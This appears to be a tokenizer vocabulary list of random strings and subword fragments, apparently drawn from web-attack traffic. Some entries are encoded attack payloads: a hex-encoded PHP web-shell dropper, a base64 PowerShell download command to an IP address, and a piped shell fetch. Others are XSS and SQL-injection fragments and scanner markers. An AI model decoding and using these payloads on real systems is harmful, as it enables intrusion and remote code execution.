jxkFtY
jFsG
kqUF
kqny
kqKF
loadPage
npmcel
pgId
pgSf
rhIX
srpb
srwy
srGf
sGWF
tYfo
tYcd
tYIB
tasks
wbLT
wbSeq
xA4
xAccept
xA8javascript
xYvo
xYKT
xYJz
##bYh4mAv
##aDoxODB
##aek1b
##k6MTp7cz
##1s21go
##uh3kg
##AOJB
##Qk2q
##3BsYX
##lcg
##lcigkdXJs
##skyljne
##CollectionsList
##NQi5IaW5hcnkg
##NvbW1
##xLF1r8x
##VF9ST
##VUIiwi
##VUVVJ
##VUWTU
##KVftY
##8gIlN
##FNYlFBdUFFNEFaUUIwQUM
##FNRQkZBRmdBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR
##LYM
##0eWxlPS
##0gQ29
##0g91wf
##ixs
##juns2gu
##juns2mn
##dj2
##RvY3M
##prectpqo
##pPyR
##pPfyIgT
##5A04
##ZwKTsKC
##ztlY2
##XQoIm
##0016HConnection
##orprepare
##702000000
idsave
HTTPS0016HConnection
24X55NZ
24X55RbUw
24X55OqyxE0
exportFile
qjbpq
managegroup
SearchUsers
SearchView
SearchResults
themesdir
cG93ZXJlYXR1
typically
012User
012Connection
012Host
1952
1958
3314
3317
33137
3761
3952
3950
4422
44289
4786
4788
478280025ESERVER
5335
533840025ESERVER
5958
5793
6956
6953
6957
6752
6750
7761
7726
7722
7724
7728
7725
8767
8768
87663
9753
CEdu
CENTRAL
DIbu
GyUs
GKtM
GKcA
GKLN
GKZO
LPou
LPVI
LPnJ
LEWd
LENGTH
LzvA
LzFz
Mqjb
Mqtx
MqHy
MqOx
MZCE
MZgC
MZfu
NeHT
NeBe
NeAY
Negotiate
NMqq
NpYv
NetSet
NetObject
PC9zZ
PqWF
PqiO
Tjli
TjGL
WYRF
WYZjF
XvmU
XvXL
YrLF
YrLp
YNqh
YNfX
YGhh
YGcW
aMXm
aMuI
ccQp
cc4uu
cpuinfo
cpGx
calls
daype
daum
dashicons
gkpy
gkvvw
gEmY
gEUW
gVXq
gubun
iFhr
iFSw
iFfw
iFoh
iBtt
iBBV
lock
loan
love
loyal
loBV
loBO
lHhz
lHWw
nAccept
nArY
nHus
nHost
nXdp
owls
oyLg
oyIf
oHDQ
oHwk
ovxZ
rsEx
rsquo
rslO
ssfep
ssfile1
schosite
tpEQ
vmri
vmkq
vmware
vmInvent
x8523
x20type
yMou
yMtD
zPYS
zPey
zWPE
zWmA
zSNl
zSyh
zvub
zvKW
##rWt7
##rWCkhKp
##bPX3ooIQ
##bWlse
##bW0s
##bnQsIF
##bnQubmV0
##bnQuY3J
##aaa6c
##aaz9g9
##ncPB
##nG05G3ch
##kbins
##kbfr3ny
##kbq8m
##kb2JlIF
##1bHQ
##1bwyoky
##1p47dj
##uPmSc
##u4WVF
##3M6M
##9f4
##WZsdXNo
##everyth
##SU5BU
##hdbsitnn
##lIU91
##NM5
##qnnj2g08p
##yu7
##yuk9
##xc9q
##VJFQ
##VJZGVu
##VJV1V
##TU9C
##0Kaz
##0KDApO
##0KaWYo
##BzdGF
##d4tk
##RAFiIrO
##RP6M
##R0qJ9t
##Rvd25
##RvKTsiKT
##ZC5pbnRl
##GV2YW
##GVWpfL
##gu3o
##guabfmu
chunk
4990OR9908
##0000009
demo2
##650949980
2093556
201216
201215
2012816
20124061
20127526
206044762
206048742
2019102817
201964173
HTTP0016HContent
181650
0x716a787671
digits
28937
28961
28975
281153
281105
281120
281119
281121
281103
38891
200070
exact
2999999MD5
171214
##uY29wZS9
x0Djavascript
x0Dsrc
x0Donerror
clearly
##woJJGNo
##woJF9Q
##9090909090909090909090909
00010268
createEvent
0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6l735a56397764585266593239756447567564484d6f4a32747364586c715a7935776148416e4c4363385033426f6343426a6247467a63794248595530784d475a424e53423749484231596d78705979426d6457356a64476c766269426658324e76626e4e30636e566a6443676b5344647464545970657942415a585a68624367694c797061527a5636613235535a6c4e724b6938694c6952494e3231314e69346949696b3749483139626d563349456468545445775a6b45314b435266556b565256555654564673784d6a4e644b54732f506963702729293b2f2f7d787878
layouts
cgt0r03uns2v9n2g08p0tkn
cgt0r03uns2v9n2g08p0q9p
cgt0r03uns2v9n2g08p0j7xt
cgt0r03uns2v9n2g08p0361p
cgt0r03uns2v9n2g08p0at91
cgt0r03uns2v9n2g08p0uo1d
11514461111111111
2Blocation
2dAl
2711
2719
2717
3427
3922
3923
3929
3925
3601
3606
379123
3556
4336
4335
4366
4369
4141
4147
4148
6dac076
7399
ATCH
ATvQ
ATasteOfT
AHsP
AjvQ
AGys
BXdw
Close0018
DWQQ
DWYq
DswP
DqQL
Dqsz
DqKI
DZmr
FlEx
FOHz
GszI
HXKM
HXuF
HXHi0
IGwc
ImageSize
ImageExt
JVmp
Ktrf
KtrN
Ktsr
KFP
KFsi
KFSe
MDpd
NIwG
Onfocus
OnError
OnMou
OWMj
OwPY
OhQ
OpMa
PFcv
PiGl
PHNjcmlwd
QHhq
QZdQ
QGlu
SnMD
SV1
SVIY
SFzU
Sdtu
TvYS
TZqc
UeFu
UVfm
WwUU
WfNl
WXjp
WXtG
WXPO
XYdF
YBGk
YBqs
YBBB
ZaJG
ZfRn
axGd
axAq
axsxsx
artInfo
artbank
artStudio
btnWrite
bsulh
bFKM
dDsC
dhjj
dhwX
dhTL
eaFV
eaoA
favorView
grava
grIg
iqBe
iiIO
imKo
jPrZ
jJIF
khGY
koreanbar
lBiQ
mJCv
mXUe
nbRD
neuE
nSNM
pqht
qnNp
rUYx
sUta
spaF
tJNk
uuid
uQjq
uXIE
veiw
wfUf
wsgi
wsUw
x9g8
x9Ajavascript
xNXH
xF0
xFxA
xFpU
xBF
x09cript
yEvu
yii
yGxx
yOzA
zjuyj
zdsx
zeros6x
##bK8nA
##buns2p3ta
##nnn
##nflfdao
##nx3t
##nx1u
##ky4
##kyfc
##DCmprO
##J207Yq
##Js9w
##2VyIGF0
##3guc2
##3guns6
##3gub3Bl
##3guyrn
##9todit
##9tg6j9
##9zZXRvcHQ
##wvcGFzc3B
##eqajh
##eqm6wt
##hblah
##hCg
##luZz
##c8snh
##qg08p0jetob
##IpOztlY2
##VwDYuw
##KFYYl
##FUiw
##L2NvbnRlbnQ
##T1NUWy
##TJfMg
##0aCBPbmx
##0zus7
##0zyhf
##0zRF3CY
##0zfcqb8b
##BUN
##jJwWH
##jha7
##jhonCdu
##RnZBg
##RVIsIHR
##mVyIC0gT
##mVyIHBhc
##gQGV2YW
##gw19IrT
##gYWRtaW5
##Yxjti
##UkVUVVJ
109245
chaofi
chaonan
chaiyaphu
##0000014
##0000092
##0000016
##00000392
##000006520
4030016300
203895388
203865719
2011FDAT
20112212
208939435
searchGCcdId
1597799494
22222222
18483
70107402
projectdiscovery
28496
28498
28450
28417
28842
28832
28840
28813
200931
200917
##0001015
47956
##0F5QURRQU1QTZBRGNBTUFBM
##AAAAt4II
DATAFLD
DATAFORMATAS
x3Dalert
##ContentLoaded
252Fcookie
252Fhtml5sec
252Fxssme2
attachments
##dGFjaG
##dGFpbnVl
0000000000000
0000000000000004
000000000119
00000000028410
000000000000006520
##UUF6QURnQUxnQXhBREVBT2dBNEFEQUFPUUF3QUM4QWJBQnlBQzRBY0FCekFERUFKd0FwQUE9PQ
##YXN0ZW
##pbnRlcnRh
##IHxzaCBodHRwOi8vNDIuMjAwLjE1Ni4z
##0cmluZyByZWFk
replyAt
444400025ESERVER
attempted
##14141414141
analyzed
##0aW9uL2Fwa
##KTsKCWZj
examples
nmaplowercheck1654
nmaplowercheck1655677132
nmaplowercheck1650949980
chlvbettufqmk5reelggi
cf578boqo4ccqlv00a10sbs
cf578boqo4ccqlv00a10xuh
cf578boqo4ccqlv00a10ds9
cf578boqo4ccqlv00a10wnm7
cf578boqo4ccqlv00a10gyqh
My2Lg6ccyJsqr42jL59NDGqHXzhGQHYpcwY
2743794
2987
3529
3524
3525
35242
39997
4612
4619
4614
474620025ESERVER
5768
5121
51239
51280
5960
7693
70001
8399
8336
8330
8406
9615
Alternate
AyRo
AyHo
ARS
ARaN
BtRL
BtGQ
Bbvf
Bbzd
BfBS
BfDr
BpSU
BpLl
BvLL
BvVi
BvXX
BvNr
CfTc
CfYw
ClientRegist
DezY
Detect
DVdT
DVHD
DKZj
DKsF
DownloadFile
EwTR
Ewig
Eyos
EyFM
FmCD
FmtR
FORDER
GuBI
GuOZ
GJkk
GJTj
GLB
GLIn
HUbr
HUnD
IrWd
JNXO
JNeo
Lrbb
LrCr
LsNa
LsSb
LNap
LNeX
LMRQ
LMWC
MapSearch
OpenBSD
QaAz
QaxC
QJaV
QJOV
QWkq
QWLt
SoCk
SoYe
SoIy
SockAd
TUMT
TUiS
Ufoo
Ufhe
UsvQ
Usrx
UqTA
UqGW
Ujti
UjsP
UjWX
UjdZ
VUuH
VUOt
WoZG
Wozr
WZSe
WZkeX
YEAR
YEII
YyRc
YyK54
YMnx
YMfN
ZJnN
ZJnA
ayIm
ayKM
aVMf
aVoA
bnkey
bnKP
bWzr
bWXn
bTSS
bTYn
cyqz
cyXw
cloudf
cce6c1c
eEpd
eEhA
egfW
fbpxa
fMkq
fetches
gXgG
gXarSmO
gotoDeal
hfci
hfDJ
iwQf
iwPs
iTyd
iTiv
jDnh
jDfO
jAHt
jAyX
jEiB
jEAW
jjRj
jj5ig08p
klAl
kl9aw
lmHJ
lm2f3uns2
llivail
llivnaeco
mFjL
mFxA
nice
oceangrid
pRsa
pRpGd
pXmD
pXcr
qwUL
qwhQ
qlGX
qlwN
qvIg
qvkvq
rqP
rowNum
swQD
swEY
sxf
sxpG
sxvcc
sxiyo
tBLD
tBPI
uqrF
uqZL
wlOB
wlFz
x2Ftype
yYiz
yYBv
yUCK
yUKM
zwum
zwXn
##rS2V
##tq5g
##krfof
##kr5fox
##k0o1
##k0WML
##DVVJMT
##A2wlt
##3t66y
##3ZXN0IENoYW5n
##9shp
##9sci5za
##9CR1d
##WVjaG
##w1c2Vj
##fwr87
##c6rWt7
##corpchie
##IwLTA2
##IUfma5
##x5k
##x5xxs8
##xkkbq4ey22
##L3RlYW
##LS0gQ29
##L2FwcG
##iw922
##BC4
##MRSwgJG
##dXJsX2
##Rpb24vY29uc
##mL8
##mZmVyIC0gT
##vm60nu
##5j3yt
##5jmj8wd
##ZSBDb2Rl
##ZSBzdHls
##Om9w
##Om1pZGRsZT
##g8yrz
##g8emh9q
##X2RAFiIrO
129672
policies
0x66796
0x675374
0x6d566d63
0x6d657a
0x5D3C42523E
9878932
##inespoilers
107485
##anySite
Revers3c
##701u0029u003C
203614392
203684421
207868508
209544628
209560753
2068171
20687586
20173202
USERDBDomains
admindede
appsgroup
8502a
prototype
boxs
boxOff
bookCd
28189
28187
281852
281881
##TRAIL
STARTcat
163443
257D
257B
25798
roomDetail
somevariable
Computer
CompanySite
player2
##c2V0X21
##c2V0b3B0KC
1234567
##LmNvbS9
general
generating
JJJ1QQQ
JJJ75QQQ
##AAAAAAAAAAAAAAAA
##WFsaWdu
##WFsZXJ0K
##DovL2FsdGF
##JGNoKTsKCWZj
1695281700807
HTTPS0023HConnection
24X55Krjp
24X55KxIM
favicons
cjnuffcebbqkkfe9m8vg3uz
cjnuffcebbqkkfe9m8vgcar
cjnuffcebbqkkfe9m8vgpsu6
cjnuffcebbqkkfe9m8vgns6p
bittorrentnnn
##6Ly93d3cuZ2lt
cG93ZXJzaGVsbCAtZW5jIFNRQkZBRmdBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUJUQUhrQWN3QjBBR1VBYlFBdUFFNEFaUUIwQUM0QVZ3QmxBR0lBWXdCc0FHa0FaUUJ1QUhRQUtRQXVBRVFBYndCM0FHNEFiQUJ2QUdFQVpBQlRBSFFBY2dCcEFHNEFad0FvQUNjQWFBQjBBSFFBY0FBNkFDOEFMd0F5QURJQU13QXVBREVBTXdBd0FDNEFNUUF6QURnQUxnQXhBREVBT2dBNEFEQUFPUUF3QU
27732
2693
3366
4d6dcba
4791
4691
4693
6992
6993
6997
8361
8369
9509
9504
APR
APLA
APmv
AcYs
AEYW
AqcU
AMPo
AYMV
Bai
BHKp
BHSs
BHeq
B0000204
CWwI
CeQw
CyXL
CmRv
DJgq
DJaN
DJOc
Domainname
DBPC
DgNJ
EEND
EEvN
EExtractValue
EVENT
EjMy
EYzO
EYyE
EYPd
English
FkaJ
FWrQ
FSZw
FSKs
FVTg
FRxL
Gkku
GwYx
GSlH
GxaE
GVCC
GBkw
GMWf
Hukkan
HfhE
HcXX
HqMA
HMcp
HOME
HBpC
IW02
IW04
IW06
IhOD
IE7
Jaws
JWyP
Jqzi
KDKq
KDfk
KDHU
KWBo
Kwrm
KSCZ
KSFw
KScvKVs
Kflk
Ksol
KsSN
KsGI
KqrY
KMyn
KvGV
KZUn
LWjL
LqXJ
LZeb
LgFv
LUoM
MPZZ
MWps
MMXR
Malformed
NfGy
NyHu
NBSX
NBJL
NBOG
NOSp
